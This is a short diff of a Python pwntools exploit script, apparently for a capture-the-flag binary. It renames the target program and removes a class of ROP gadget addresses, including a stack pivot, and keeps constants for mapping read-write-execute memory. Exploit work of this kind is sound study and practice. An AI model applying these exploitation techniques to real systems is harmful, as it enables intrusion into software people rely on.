@@ -13,7 +13,7 @@ import subprocess
 
 from pwn import *
 
-PROG_PATH = './rotf'
+PROG_PATH = './challenge'
 
 PROT_RWX = constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC
 EGG_SIZE = 0x1000
@@ -56,20 +56,6 @@ class Addrs:
     CHOICE_BUF = 0x603100
     MMAP = 0x4008e0
     READ = 0x400930
-
-
-class Gadgets:
-    POP_RDI = 0x0000000000401533
-    POP_RSI = 0x0000000000401514
-    POP_RDX = 0x0000000000401518
-    POP_R8_R9_RCX = 0x0000000000402711
-
-    POP_RAX_R9_RCX = 0x0000000000402712
-
-    JMP_RAX = 0x0000000000400ee3
-
-    # pop rsp; pop r13; pop r14; pop r15; ret;
-    POP_RSP = 0x0000000000401c2d
 
 
 def write_binary(io):
